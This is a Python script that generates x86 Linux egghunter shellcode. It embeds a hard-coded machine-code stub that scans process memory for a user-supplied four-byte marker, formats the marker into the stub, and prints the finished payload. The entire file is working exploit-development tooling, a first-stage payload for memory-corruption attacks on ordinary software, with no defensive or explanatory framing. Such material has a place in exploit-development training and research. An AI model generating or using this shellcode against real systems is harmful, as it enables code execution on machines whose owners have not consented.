#!/usr/bin/env python3

from argparse import ArgumentParser
from binascii import a2b_uu, hexlify
import sys

sc = ("\\x31\\xd2\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x6a\\x21\\x58"
      "\\xcd\\x80\\x3c\\xf2\\x74\\xee\\xb8{egg}\\x89\\xd7\\xaf"
      "\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7")

if __name__ == '__main__':
    parser = ArgumentParser(description="Egghunter Shellcode Generator")
    parser.add_argument('egg', type=str, nargs='?', default="3ggs",
            help='The four byte (not character) egg to search for in memory')
    args = parser.parse_args()

    if len(args.egg) != 4:
        print('[!] Error: Egg is not exactly four bytes long')
        sys.exit(1)

    egg_hex = hexlify(args.egg.encode('utf-8'))

    formatted_egg = "\\x{d}\\x{c}\\x{b}\\x{a}".format(
            a=egg_hex[6:8].decode('utf-8'),
            b=egg_hex[4:6].decode('utf-8'),
            c=egg_hex[2:4].decode('utf-8'),
            d=egg_hex[0:2].decode('utf-8'))

    if '\\x00' in formatted_egg:
        print('[!] Warning: The egg you chose contains a null value.')

    print('Egg:')
    print(formatted_egg)
    print('Shellcode:')
    print(sc.format(egg=str(formatted_egg)))
